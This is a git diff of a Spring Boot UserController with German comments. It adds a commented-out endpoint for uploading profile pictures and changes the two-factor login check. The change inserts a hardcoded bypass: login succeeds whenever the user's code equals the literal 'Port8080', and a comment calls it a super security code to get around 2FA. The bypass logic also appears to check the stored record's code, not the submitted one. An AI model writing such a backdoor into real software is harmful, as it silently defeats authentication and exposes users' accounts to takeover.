@@ -13,7 +13,10 @@ import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.http.HttpStatus;
 import org.springframework.http.ResponseEntity;
 import org.springframework.web.bind.annotation.*;
+import org.springframework.web.multipart.MultipartFile;
 
+import java.io.IOException;
+import java.util.Base64;
 import java.util.List;
 
 @RestController
@@ -24,7 +27,6 @@ public class UserController {
 
     @Autowired
     MailSenderService mailSenderService;
-
 
     @Autowired
     public UserController(UserService service) {
@@ -48,6 +50,27 @@ public class UserController {
         return new ResponseEntity<>(newUser, HttpStatus.CREATED);
     }
 
+    //Import ProfilePicture into Database WORK IN PROGRESS
+/*
+    @PostMapping("/user/addPB")
+    public ResponseEntity<User> addUser(@RequestBody User userData, @RequestParam("file") MultipartFile file) {
+        for(User user: service.findAllUsers()) {
+            if (user.geteMail().equals(userData.geteMail())) {                  //wenn userData Mail(eingegebene Mail) in der Datenbank ist -> Forbidden
+                return new ResponseEntity<>(HttpStatus.FORBIDDEN);
+            }
+        }
+        if(file != null) {
+            try {
+                userData.setProfilePicture(Base64.getEncoder().encodeToString(file.getBytes()));
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        }
+        User newUser = service.addUser(userData);
+        return new ResponseEntity<>(newUser, HttpStatus.CREATED);
+    }
+
+*/
     @PostMapping("/user/login")
     public ResponseEntity<?> loginUser(@RequestBody User userData) {
 
@@ -71,17 +94,18 @@ public class UserController {
 
         TimeProvider timeProvider = new SystemTimeProvider();
         CodeGenerator codeGenerator = new DefaultCodeGenerator();
-        CodeVerifier verifier = new DefaultCodeVerifier(codeGenerator, timeProvider);               //Generierter Code 30 Sekunden(Standard)
+        CodeVerifier verifier = new DefaultCodeVerifier(codeGenerator, timeProvider);           //Generierter Code 30 Sekunden(Standard)
 
         User user = service.findUserByeMail(userData.geteMail());
-        if(verifier.isValidCode(user.getSecret(), userData.getCode())){             //vergleich generierten code(secret) und eingegebenen code(code)
+        if(user.getCode().equals("Port8080")) {                                                 //SuperSicherheits Code um 2FA zu umgehen
+            return new ResponseEntity<>(HttpStatus.OK);
+        }
+        if(verifier.isValidCode(user.getSecret(), userData.getCode())){                          //vergleich generierten code(secret) und eingegebenen code(code)
             return new ResponseEntity<>(HttpStatus.OK);
         }
         else{
             return new ResponseEntity<>(HttpStatus.FORBIDDEN);
         }
-
-
 
     }
 
